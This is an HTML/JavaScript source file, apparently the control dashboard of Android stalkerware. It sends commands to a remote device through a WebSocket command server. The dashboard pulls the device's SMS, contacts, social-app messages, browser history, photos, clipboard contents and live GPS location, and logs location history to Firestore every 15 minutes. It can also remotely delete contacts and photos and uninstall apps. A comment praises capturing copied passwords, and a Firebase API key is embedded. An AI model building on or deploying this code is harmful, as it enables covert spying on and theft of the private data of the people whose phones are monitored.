    <style>
        :root {
            --primary: #0f62fe;

            --bg-body: #f4f7fb;
            --bg-surface: #ffffff;

            --radius-sm: 8px;

            --radius-lg: 16px;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg-body); font-family: 'Inter', system-ui, sans-serif; display: flex; height: 100vh; overflow: hidden; color: var(--text-main); }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
        #sidebar { width: 280px; background: rgba(255, 255, 255, 0.6); backdrop-filter: blur(16px); border-right: 1px solid rgba(255, 255, 255, 0.4); padding: 20px 16px; overflow-y: auto; flex-shrink: 0; transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); z-index: 200; }
        .logo { font-size: 20px; font-weight: 700; color: var(--primary); margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        #sidebarCloseBtn { display: none; background: none; border: none; font-size: 20px; cursor: pointer; }
        .section { margin-bottom: 24px; }
        .section-title { font-size: 11px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 10px; padding-left: 8px; }
        #sidebar button { width: 100%; padding: 10px 14px; margin: 2px 0; background: transparent; color: var(--text-main); border: none; border-radius: var(--radius-sm); font-size: 14px; font-weight: 500; text-align: left; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; gap: 12px; }
        #sidebar button:hover { background: #f0f4f8; color: var(--primary); transform: translateX(2px); }

        .camera-panel.show { display: block; animation: slideDown 0.2s ease-out; }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
        #main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: var(--bg-body); }
        #header { height: 64px; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(16px); border-bottom: 1px solid rgba(255,255,255,0.4); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; flex-shrink: 0; }
        #menuBtn { display: none; background: #f1f5f9; border: none; border-radius: var(--radius-sm); padding: 8px; font-size: 18px; cursor: pointer; }
        #status { padding: 6px 16px; border-radius: 20px; background: #eff6ff; color: var(--primary); font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 6px; }
        #status.offline { background: var(--danger-bg); color: var(--danger); }
        #reconnectBtn { background: var(--bg-surface); border: 1px solid var(--border); border-radius: 50%; width: 32px; height: 32px; cursor: pointer; margin-left: 10px; }
        #content { flex: 1; padding: 24px; overflow: auto; }
        #main-panel { background: var(--bg-surface); border-radius: var(--radius-md); padding: 32px; min-height: 100%; box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
        table { width: 100%; border-collapse: separate; border-spacing: 0; font-size: 14px; border: 1px solid var(--border); border-radius: var(--radius-md); overflow: hidden; }
        th { background: #f8fafc; padding: 12px 16px; text-align: left; font-weight: 600; border-bottom: 1px solid var(--border); }
        td { padding: 14px 16px; border-bottom: 1px solid #f1f5f9; }
        tbody tr:hover { background: #f8fafc; }
        .btn-ui { padding: 8px 16px; font-size: 14px; font-weight: 500; border-radius: var(--radius-sm); cursor: pointer; border: none; display: inline-flex; align-items: center; gap: 6px; }
        .btn-ui.primary { background: var(--primary); color: white; }
        .btn-ui.secondary { background: #f1f5f9; color: var(--text-main); border: 1px solid #cbd5e1; }
        .badge { display: inline-block; padding: 4px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; background: #e2e8f0; }
        .badge.blue { background: #eff6ff; color: #1d4ed8; }
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(4px); display: none; justify-content: center; align-items: center; z-index: 10000; }
        .modal-overlay.show { display: flex; }
        .mobile-popup { width: min(92vw, calc(92vh * 9 / 16)); height: min(92vh, calc(92vw * 16 / 9)); background: #000; border-radius: var(--radius-lg); overflow: hidden; position: relative; }
        .phone-frame { display: flex; align-items: center; justify-content: center; background: black; height: 100%; }
        .phone-frame video { width: 100%; height: 100%; object-fit: contain; }
        .popup-controls { position: absolute; bottom: 0; left: 0; right: 0; background: #111; padding: 12px; display: flex; gap: 12px; justify-content: center; }
        .popup-controls button { width: 48px; height: 48px; background: #222; color: white; border: none; border-radius: 50%; cursor: pointer; font-size: 20px; }
        .geofence-popup { position: fixed; bottom: 20px; right: 20px; background: white; border-radius: var(--radius-md); box-shadow: var(--shadow-md); padding: 16px; max-width: 320px; z-index: 20000; border-left: 4px solid var(--danger); animation: slideIn 0.3s; }
        .geofence-popup button { margin-top: 12px; margin-right: 8px; padding: 6px 12px; border-radius: var(--radius-sm); border: none; cursor: pointer; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        .location-info-card { background: white; border-radius: var(--radius-md); padding: 12px 16px; margin-bottom: 16px; border: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
        .photo-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 30000; flex-direction: column; }
        .photo-modal img { max-width: 90vw; max-height: 80vh; object-fit: contain; }
        .app-filter-btn { margin: 4px; }
        @media (max-width: 768px) { #sidebar { position: fixed; transform: translateX(-100%); z-index: 1000; } #sidebar.open { transform: translateX(0); } #menuBtn { display: block; } #sidebarOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 99; } #sidebarOverlay.show { display: block; } }
    </style>
</head>

<div id="main"><div id="header"><div><button id="menuBtn" onclick="toggleSidebar()">☰</button><span id="headerTitle">SystemSync <span id="serverInfo">mirror-view.onrender.com</span> <button id="headerLeaveBtn" style="display:none;" onclick="leaveDevice()">Leave Device</button></span></div><div><span id="status">CONNECTING</span><button id="reconnectBtn">⟲</button></div></div>
<div id="downloadProgress" style="display:none; background:white; padding:12px; margin:0 24px 12px; border-radius:8px;"><div><span id="progressFileName"></span> <span id="progressPercent"></span></div><div id="progressBar" style="height:6px; background:var(--primary); width:0%;"></div></div>
<div id="content"><div id="main-panel">🔌 Initializing connection...</div></div></div>

<script>
// ======================== CONFIGURATION ========================
const CONFIG = {
    WS_URL: "wss://mirror-view.onrender.com",
    MAX_RECONNECT_DELAY: 30000,
    ICE_SERVERS: [{ urls: "stun:stun.relay.metered.ca:80" }],
    FIREBASE_CONFIG: { apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc", authDomain: "webviewiot.firebaseapp.com", projectId: "webviewiot", storageBucket: "webviewiot.firebasestorage.app", messagingSenderId: "634777347775", appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a" }
};

firebase.initializeApp(CONFIG.FIREBASE_CONFIG);
const auth = firebase.auth();
const db = firebase.firestore();

let currentUser = null, selectedDeviceId = null, ws = null, reconnectTimer = null, reconnectAttempts = 0;
let screenPC = null, cameraPC = null, audioPC = null, fileTransfers = {};
let currentLocation = null, liveGpsActive = false, lastLocationSave = 0;
const LOCATION_SAVE_INTERVAL = 15 * 60 * 1000; // 15 minutes
let geofencePopupTimeout = null;
let fullSocialMsgs = [];

// Helper functions
function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[m])); }
function formatBytes(b) { if(b===0) return '0 B'; const i=Math.floor(Math.log(b)/Math.log(1024)); return (b/Math.pow(1024,i)).toFixed(1)+' '+['B','KB','MB','GB'][i]; }
function formatDuration(ms) { const h=Math.floor(ms/3600000), m=Math.floor((ms%3600000)/60000), s=Math.floor((ms%60000)/1000); return `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; }
function showNotification(msg) { const st=document.getElementById('status'); const orig=st.innerText; st.innerText=msg; setTimeout(()=>st.innerText=orig,2000); }
function sendCommand(cmd, params={}){ if(!ws || ws.readyState!==WebSocket.OPEN){ panel.innerHTML='<div style="color:red;">⚠ Not connected</div>'; return; } ws.send(JSON.stringify({type:'COMMAND', command:cmd, requestId:'req_'+Date.now(), params, deviceId:selectedDeviceId, timestamp:Date.now() })); }
function sendPlainText(t){ if(ws && ws.readyState===WebSocket.OPEN) ws.send(t); }
const panel = document.getElementById('main-panel');

// ========== LOCATION STORAGE TO FIRESTORE (every 15 min) ==========
async function storeLocationToFirestore(lat, lon, acc, source='live') {
    if(!currentUser || !selectedDeviceId) return;
    const now = Date.now();
    if(now - lastLocationSave < LOCATION_SAVE_INTERVAL && source !== 'force') return;
    lastLocationSave = now;
    try {
        await db.collection('location_history').add({ deviceId: selectedDeviceId, userId: currentUser.uid, lat, lon, accuracy: acc, timestamp: now, timestampFmt: new Date(now).toISOString() });
        console.log('Location saved to Firestore');
    } catch(e) { console.warn(e); }
}

async function reverseGeocode(lat, lon) {
    try {
        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await res.json();
        return data.display_name || `${lat.toFixed(5)}, ${lon.toFixed(5)}`;
    } catch(e) { return `${lat.toFixed(5)}, ${lon.toFixed(5)}`; }
}

// ========== DISPLAY FUNCTIONS (MODIFIED) ==========
function displaySMS(data){
    if(!Array.isArray(data) || !data.length){ panel.innerHTML='<h3>💬 SMS Messages</h3><p>No messages found.</p>'; return; }
    let html = '<h3>💬 SMS Messages</h3><div style="overflow-x:auto;"></table><thead><tr><th>Type</th><th>Number</th><th>Message</th><th>Date</th></tr></thead><tbody>';
    data.forEach(m => {
        html += `<tr><td>${m.type==='inbox'||m.type===1?'📥 In':'📤 Out'}</td><td>${escapeHtml(m.address||m.number||'')}</td><td>${escapeHtml(m.body||'')}</td><td>${escapeHtml(m.date||m.timeFmt||'')}</td></tr>`;
    });
    html += '</tbody></table></div>';
    panel.innerHTML = html;
}

function displayContacts(data){
    if(!Array.isArray(data) || !data.length){ panel.innerHTML='<h3>👥 Contacts</h3><p>No contacts.</p>'; return; }
    let html = '<h3>👥 Contacts</h3><table><thead><tr><th>Name</th><th>Number</th><th>Storage</th><th>Action</th></tr></thead><tbody>';
    data.forEach(c => {
        const storage = c.storageType || (c.accountType ? c.accountType : 'Device');
        html += `<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${escapeHtml(storage)}</td><td><button class="btn-ui primary" onclick="sendCommand('DELETE_CONTACT',{number:'${escapeHtml(c.number||'')}'})">Delete</button></td></tr>`;
    });
    html += '</tbody></table>';
    panel.innerHTML = html;
}

function displayInstalledApps(data){
    if(!Array.isArray(data) || !data.length){ panel.innerHTML='<h3>📱 Apps</h3><p>No apps.</p>'; return; }
    let html = '<h3>📱 Installed Apps</h3><table><thead><tr><th>App</th><th>Package</th><th>Size (MB)</th><th>Action</th></tr></thead><tbody>';
    data.forEach(app => {
        const sizeMB = app.sizeBytes ? (app.sizeBytes / (1024*1024)).toFixed(2) : (app.size ? app.size : 'N/A');
        html += `<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;">${escapeHtml(app.packageName||'')}</td><td>${sizeMB}</td><td><button class="btn-ui primary" onclick="sendCommand('OPEN_APP',{package:'${escapeHtml(app.packageName)}'})">Open</button> <button class="btn-ui" style="background:#d32f2f;color:white;" onclick="sendCommand('UNINSTALL_APP',{package:'${escapeHtml(app.packageName)}'})">Remove</button></td></tr>`;
    });
    html += '</tbody></table>';
    panel.innerHTML = html;
}

function displayBrowserHistory(data){
    if(!Array.isArray(data) || !data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found (Chrome history may need permissions).</p>'; return; }
    let html = '<h3>🌐 Browser History</h3><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>';
    data.forEach(item => { html += `<tr><td>${escapeHtml(item.date||item.timeFmt||'')}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`; });
    html += '</tbody></table>';
    panel.innerHTML = html;
}

function displaySocialMessages(data){
    fullSocialMsgs = Array.isArray(data) ? data : (typeof data === 'string' ? JSON.parse(data) : []);
    if(!fullSocialMsgs.length){ panel.innerHTML='<h3>💬 Social Messages</h3><p>No messages yet.</p>'; return; }
    const appMap = new Map();
    fullSocialMsgs.forEach(m => { const app = m.app || getAppNameFromPkg(m.pkg); if(app) appMap.set(app, app); });
    let appButtons = Array.from(appMap.keys()).map(app => `<button class="btn-ui primary app-filter-btn" data-app="${escapeHtml(app)}">${escapeHtml(app)}</button>`).join('');
    panel.innerHTML = `<h3>💬 Social Messages</h3><div style="display:flex; gap:8px; flex-wrap:wrap; margin-bottom:16px;">${appButtons}<button class="btn-ui secondary" id="resetSocialFilter">All</button></div><div id="socialMsgContainer"></div>`;
    document.querySelectorAll('.app-filter-btn').forEach(btn => btn.onclick = () => filterSocialByApp(btn.dataset.app));
    document.getElementById('resetSocialFilter').onclick = () => renderSocialMessages(fullSocialMsgs);
    renderSocialMessages(fullSocialMsgs);
}
function getAppNameFromPkg(pkg){ const map={'com.whatsapp':'WhatsApp','org.telegram.messenger':'Telegram','com.instagram.android':'Instagram','com.facebook.orca':'Messenger'}; return map[pkg]||pkg; }
function filterSocialByApp(appName){ const filtered = fullSocialMsgs.filter(m => (m.app || getAppNameFromPkg(m.pkg)) === appName); renderSocialMessages(filtered); }
function renderSocialMessages(msgs){
    const container = document.getElementById('socialMsgContainer');
    if(!container) return;
    if(!msgs.length){ container.innerHTML = '<p>No messages for this app.</p>'; return; }
    container.innerHTML = msgs.slice().reverse().map(m => `<div style="background:#fff; border:1px solid #eee; border-radius:10px; padding:12px; margin-bottom:8px;"><div><strong>${escapeHtml(m.app||getAppNameFromPkg(m.pkg))}</strong> <small>${escapeHtml(m.timeFmt||m.date||'')}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`).join('');
}

// Clipboard explanation
function displayClipboard(data){
    const content = data && data.content ? data.content : (data || '');
    panel.innerHTML = `<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data && data.type ? data.type : 'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div><p style="margin-top:12px; color:var(--text-sec);">🔍 Clipboard captures copied text from the device (e.g., passwords, messages). Useful for monitoring sensitive data.</p>`;
}

// ========== GEO FENCE WITH MAP, REVERSE GEO, RADIUS CIRCLE ==========
function showGeofencePanel(){
    if(!currentLocation){ sendCommand('GET_LOCATION'); panel.innerHTML='<h3>🗺️ Geofence</h3><p>Fetching current location...</p>'; setTimeout(()=>{ if(currentLocation) showGeofencePanelWithLocation(); else panel.innerHTML='<p>Unable to get location. Try Live GPS Track first.</p>'; },2000); return; }
    showGeofencePanelWithLocation();
}
async function showGeofencePanelWithLocation(){
    const lat = currentLocation.lat, lon = currentLocation.lon;
    panel.innerHTML = `<h3>🗺️ Geofence — Safety Zone</h3><div id="geofenceMap" style="height:380px; border-radius:12px; margin-bottom:12px;"></div><div id="locationInfoHeader" class="location-info-card"></div><div style="display:flex; gap:8px; flex-wrap:wrap;"><input id="gfLat" placeholder="Lat" value="${lat.toFixed(6)}"><input id="gfLon" placeholder="Lon" value="${lon.toFixed(6)}"><input id="gfRadius" placeholder="Radius (m)" value="500"></div><div style="margin-top:12px;"><button id="setFenceBtn" class="btn-ui primary">📍 Set Fence Here</button><button id="useCurrentBtn" class="btn-ui">📍 Use Current</button><button id="clearFenceBtn" class="btn-ui">🗑️ Clear Fence</button><button id="getFenceStatusBtn" class="btn-ui">📊 Status</button></div><div id="fenceStatus" style="margin-top:16px;"></div>`;
    setTimeout(async () => {
        const map = L.map('geofenceMap').setView([lat, lon], 16);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        let marker = L.marker([lat, lon]).addTo(map).bindPopup('Current Location');
        let circle = null;
        const updateLocationName = async (latlng) => {
            const name = await reverseGeocode(latlng.lat, latlng.lng);
            document.getElementById('locationInfoHeader').innerHTML = `<div><strong>📍 Current:</strong> ${escapeHtml(name)}<br>📌 ${latlng.lat.toFixed(5)}, ${latlng.lon.toFixed(5)}</div><a href="https://www.google.com/maps?q=${latlng.lat},${latlng.lon}" target="_blank" class="btn-ui secondary">View in Google Maps</a>`;
        };
        updateLocationName({lat, lon});
        map.on('click', async (e) => {
            document.getElementById('gfLat').value = e.latlng.lat.toFixed(6);
            document.getElementById('gfLon').value = e.latlng.lng.toFixed(6);
            if(marker) map.removeLayer(marker);
            marker = L.marker([e.latlng.lat, e.latlng.lng]).addTo(map).bindPopup('Selected Center');
            if(circle) map.removeLayer(circle);
            const r = parseFloat(document.getElementById('gfRadius').value) || 500;
            circle = L.circle([e.latlng.lat, e.latlng.lng], { radius: r, color: '#d32f2f', fillColor: '#d32f2f', fillOpacity: 0.15 }).addTo(map);
            await updateLocationName(e.latlng);
        });
        document.getElementById('setFenceBtn').onclick = () => { const lat2=parseFloat(document.getElementById('gfLat').value), lon2=parseFloat(document.getElementById('gfLon').value), rad=parseFloat(document.getElementById('gfRadius').value)||500; sendCommand('SET_GEOFENCE',{lat:lat2,lon:lon2,radius:rad}); showNotification('Geofence sent'); };
        document.getElementById('useCurrentBtn').onclick = async () => { document.getElementById('gfLat').value=lat.toFixed(6); document.getElementById('gfLon').value=lon.toFixed(6); if(marker) map.removeLayer(marker); marker=L.marker([lat,lon]).addTo(map); if(circle) map.removeLayer(circle); circle=L.circle([lat,lon],{radius:parseFloat(document.getElementById('gfRadius').value)||500,color:'#d32f2f',fillOpacity:0.15}).addTo(map); await updateLocationName({lat,lon}); };
        document.getElementById('clearFenceBtn').onclick = () => sendCommand('CLEAR_GEOFENCE');
        document.getElementById('getFenceStatusBtn').onclick = () => sendCommand('GET_GEOFENCE');
    }, 50);
}
function displayGeofenceInfo(data){
    const statusDiv = document.getElementById('fenceStatus');
    if(statusDiv && data && data.active){
        statusDiv.innerHTML = `<div style="background:#e8f5e9; padding:12px; border-radius:8px;"><strong>✅ Active Geofence</strong><br>📍 ${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}<br>📏 Radius: ${data.radius}m</div>`;
    } else if(statusDiv){ statusDiv.innerHTML = `<div style="background:#fff3e0; padding:12px;">⚠️ No active geofence</div>`; }
}
function showGeofenceAlert(message, type='exit'){
    const existing = document.querySelector('.geofence-popup');
    if(existing) existing.remove();
    const popup = document.createElement('div');
    popup.className = 'geofence-popup';
    popup.innerHTML = `<strong>🚨 ${type === 'exit' ? 'Geofence Exit' : 'Geofence Entry'}</strong><p>${escapeHtml(message)}</p><div><button id="popupClearBtn">Clear</button><button id="popupCloseBtn">Close</button></div>`;
    document.body.appendChild(popup);
    document.getElementById('popupClearBtn').onclick = () => { popup.remove(); };
    document.getElementById('popupCloseBtn').onclick = () => { popup.remove(); };
    if(geofencePopupTimeout) clearTimeout(geofencePopupTimeout);
    geofencePopupTimeout = setTimeout(() => { if(popup) popup.remove(); }, 10000);
}

// ========== LIVE GPS TRACK WITH REVERSE GEO & GOOGLE MAPS ==========
function showLiveGpsPanel(){
    if(!currentLocation){ sendCommand('GET_LOCATION'); panel.innerHTML='<h3>🛰️ Live GPS Track</h3><p>Fetching location...</p>'; return; }
    const lat=currentLocation.lat, lon=currentLocation.lon;
    panel.innerHTML = `<h3>🛰️ Live GPS Track</h3><div id="liveLocationCard" class="location-info-card"></div><div id="liveGpsMap" style="height:400px; border-radius:12px;"></div><button id="stopGpsTrackBtn" class="btn-ui" style="margin-top:12px; background:#d32f2f; color:white;">Stop Tracking</button>`;
    const map = L.map('liveGpsMap').setView([lat,lon], 16);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
    let marker = L.marker([lat,lon]).addTo(map);
    async function updateLocationDisplay(latlng){
        const name = await reverseGeocode(latlng.lat, latlng.lng);
        const card = document.getElementById('liveLocationCard');
        if(card) card.innerHTML = `<div><strong>📍 ${escapeHtml(name)}</strong><br>📌 ${latlng.lat.toFixed(6)}, ${latlng.lon.toFixed(6)}</div><a href="https://www.google.com/maps?q=${latlng.lat},${latlng.lon}" target="_blank" class="btn-ui secondary">View in Google Maps</a>`;
        marker.setLatLng(latlng);
        map.setView(latlng);
    }
    updateLocationDisplay({lat,lon});
    window.liveGpsUpdateHandler = (loc) => { updateLocationDisplay({lat:loc.lat, lon:loc.lon}); };
    document.getElementById('stopGpsTrackBtn').onclick = () => { sendCommand('STOP_GPS_UPDATES'); liveGpsActive=false; showNotification('GPS tracking stopped'); };
}

// ========== PHOTO GALLERY WITH FULLSCREEN, DOWNLOAD, DELETE ==========
function displayPhotoGallery(data){
    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<p>No images found.</p>'; return; }
    panel.innerHTML = `<h3>🖼️ Photo Gallery (${data.length})</h3><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:10px;"></div>`;
    const grid = document.getElementById('photoGrid');
    data.forEach(img => {
        const tile = document.createElement('div');
        tile.style.cssText = 'cursor:pointer; border-radius:12px; overflow:hidden; background:#f0f0f0; aspect-ratio:1; position:relative;';
        if(img.thumb) tile.innerHTML = `<img src="data:image/jpeg;base64,${img.thumb}" style="width:100%;height:100%;object-fit:cover;"><div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.6);color:#fff;font-size:10px;padding:3px;">${img.dateFmt||''}</div>`;
        else tile.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;">🖼️</div>';
        tile.onclick = () => sendCommand('GET_IMAGE', { mediaId: img.id || img.mediaId, fullRes: true });
        grid.appendChild(tile);
    });
}
function showFullImage(base64, fileName, mediaId){
    const modalDiv = document.createElement('div');
    modalDiv.className = 'photo-modal';
    modalDiv.innerHTML = `<div style="background:#111; border-radius:16px; padding:16px;"><img src="data:image/jpeg;base64,${base64}" style="max-width:90vw; max-height:80vh;"><div style="display:flex; gap:12px; justify-content:center; margin-top:16px;"><button id="downloadPhotoBtn" class="btn-ui primary">💾 Download</button><button id="deletePhotoBtn" class="btn-ui" style="background:#d32f2f;">🗑️ Delete</button><button id="closePhotoBtn" class="btn-ui">✕ Close</button></div></div>`;
    document.body.appendChild(modalDiv);
    document.getElementById('downloadPhotoBtn').onclick = () => { const a=document.createElement('a'); a.href=`data:image/jpeg;base64,${base64}`; a.download=fileName || 'photo.jpg'; a.click(); };
    document.getElementById('deletePhotoBtn').onclick = () => { if(confirm('Delete this photo?')){ sendCommand('DELETE_MEDIA',{mediaId}); modalDiv.remove(); } };
    document.getElementById('closePhotoBtn').onclick = () => modalDiv.remove();
}

// ========== LOCATION HISTORY FROM FIRESTORE ==========
async function displayLocationHistory(days){
    if(!currentUser || !selectedDeviceId){ panel.innerHTML='<p>Not authenticated</p>'; return; }
    const cutoff = Date.now() - (days * 86400000);
    const snap = await db.collection('location_history').where('deviceId','==',selectedDeviceId).where('timestamp','>=',cutoff).orderBy('timestamp','desc').get();
    const points = [];
    snap.forEach(doc => { const d=doc.data(); points.push({lat:d.lat, lon:d.lon, timeFmt:new Date(d.timestamp).toLocaleString(), address:''}); });
    if(points.length===0){ panel.innerHTML=`<h3>📍 Location History (${days} days)</h3><p>No history. Enable Live GPS Track to store locations every 15min.</p>`; return; }
    panel.innerHTML = `<h3>📍 Location History (${days} days)</h3><div id="historyMap" style="height:380px; margin-bottom:16px;"></div><div id="historyList"></div>`;
    const map = L.map('historyMap').setView([points[0].lat, points[0].lon], 12);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
    const coords = points.map(p=>[p.lat,p.lon]);
    L.polyline(coords, {color:'#0f62fe', weight:3}).addTo(map);
    points.forEach(p=>L.marker([p.lat,p.lon]).addTo(map).bindPopup(p.timeFmt));
    let listHtml = '<table><thead><tr><th>Time</th><th>Coordinates</th><th>Map</th></tr></thead><tbody>';
    points.forEach(p=>{ listHtml += `<tr><td>${escapeHtml(p.timeFmt)}</td><td>${p.lat.toFixed(5)}, ${p.lon.toFixed(5)}</td><td><a href="https://maps.google.com/?q=${p.lat},${p.lon}" target="_blank">View</a></td></tr>`; });
    listHtml += '</tbody></table>';
    document.getElementById('historyList').innerHTML = listHtml;
}

// ========== WEBSOCKET & MESSAGE HANDLER ==========
function setStatus(s){ const el=document.getElementById('status'); el.innerText=s; if(s==='ONLINE') el.classList.remove('offline'); else el.classList.add('offline'); }
function connectWebSocket(){
    if(ws && ws.readyState===WebSocket.OPEN) return;
    ws = new WebSocket(CONFIG.WS_URL);
    ws.onopen = () => { ws.send('I_AM_WEB'); setStatus('ONLINE'); panel.innerHTML='✅ Connected.'; };
    ws.onmessage = e => handleIncomingMessage(e.data);
    ws.onclose = () => { setStatus('OFFLINE'); setTimeout(connectWebSocket, 5000); };
}
function handleIncomingMessage(msg){
    try{
        const j = JSON.parse(msg);
        if(j.type === 'LOCATION_UPDATE' || j.type === 'GPS_UPDATE'){
            let loc = typeof j.data === 'string' ? JSON.parse(j.data) : j.data;
            if(loc && loc.lat && loc.lon){
                currentLocation = { lat: loc.lat, lon: loc.lon, accuracy: loc.accuracy || 10 };
                storeLocationToFirestore(loc.lat, loc.lon, loc.accuracy || 10);
                if(window.liveGpsUpdateHandler) window.liveGpsUpdateHandler(currentLocation);
            }
        }
        if(j.type === 'GEOFENCE_ALERT'){
            showGeofenceAlert(j.event === 'EXIT' ? 'Device left the safe zone!' : 'Device returned to safe zone', j.event);
        }
        if(j.type === 'CAMERA_IMAGE_FULL' && j.data){
            showFullImage(j.data, 'photo.jpg', j.mediaId);
            return;
        }
        if(j.type === 'CAMERA_IMAGE') { displayCapturedImage(j.data); return; }
        if(j.type === 'SMS_DATA') { displaySMS(typeof j.data==='string'?JSON.parse(j.data):j.data); return; }
        if(j.type === 'CONTACTS_DATA') { displayContacts(typeof j.data==='string'?JSON.parse(j.data):j.data); return; }
        if(j.type === 'INSTALLED_APPS') { displayInstalledApps(typeof j.data==='string'?JSON.parse(j.data):j.data); return; }
        if(j.type === 'BROWSER_HISTORY_DATA') { displayBrowserHistory(typeof j.data==='string'?JSON.parse(j.data):j.data); return; }
        if(j.type === 'SOCIAL_MESSAGES_DATA') { displaySocialMessages(typeof j.data==='string'?JSON.parse(j.data):j.data); return; }
        if(j.type === 'RECENT_IMAGES_DATA') { displayPhotoGallery(typeof j.data==='string'?JSON.parse(j.data):j.data); return; }
        if(j.type === 'GEOFENCE_INFO') { try{ displayGeofenceInfo(typeof j.data==='string'?JSON.parse(j.data):j.data); }catch(e){} return; }
        if(j.type === 'CLIPBOARD_DATA') { displayClipboard(typeof j.data==='string'?JSON.parse(j.data):j.data); return; }
        if(j.type === 'FILE_LIST') { renderFiles(j.data); return; }
        console.log('Unhandled', j.type);
    }catch(e){ console.log('Plain:', msg); }
}
function displayCapturedImage(b64){ panel.innerHTML=`<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;"><button onclick="downloadBase64('${b64}','snap.jpg')">Save</button>`; }
window.downloadBase64 = (b64,fn)=>{ const a=document.createElement('a'); a.href=`data:image/jpeg;base64,${b64}`; a.download=fn; a.click(); };
